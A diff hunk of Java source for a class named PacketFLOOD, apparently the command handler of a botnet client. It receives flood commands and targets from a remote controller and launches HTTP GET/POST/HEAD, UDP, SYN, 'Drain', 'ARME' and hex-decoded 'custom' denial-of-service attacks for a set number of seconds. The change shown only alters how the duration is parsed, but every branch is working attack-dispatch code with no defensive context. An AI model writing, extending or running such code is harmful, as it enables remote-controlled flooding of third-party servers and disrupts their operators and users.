@@ -17,42 +17,42 @@ public class PacketFLOOD extends AbstractPacket {
 	public void read(String line) throws Exception {
 		if (line.equals("FLOOD HTTPGET")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new HTTP(target, Constants.HTTP_GET).start();
 		} else if (line.equals("FLOOD HTTPPOST")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new HTTP(target, Constants.HTTP_POST).start();
 		} else if (line.equals("FLOOD HTTPHEAD")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new HTTP(target, Constants.HTTP_HEAD).start();
 		} else if (line.equals("FLOOD UDP")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
 		} else if (line.equals("FLOOD SSYN")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new SSYN(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
 		} else if (line.equals("FLOOD DRAIN")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new Drain(target).start();
 		} else if (line.equals("FLOOD ARME")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			new FloodTime(seconds).start();
 			new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
 		} else if (line.equals("FLOOD CUSTOM")) {
 			String target = Connection.readLine();
-			int seconds = Integer.parseInt(Connection.readLine());
+			int seconds = Connection.readInt();
 			String code = Connection.readLine();
 			code = Hex.decode(code.substring(2, code.length()));
 			new FloodTime(seconds).start();
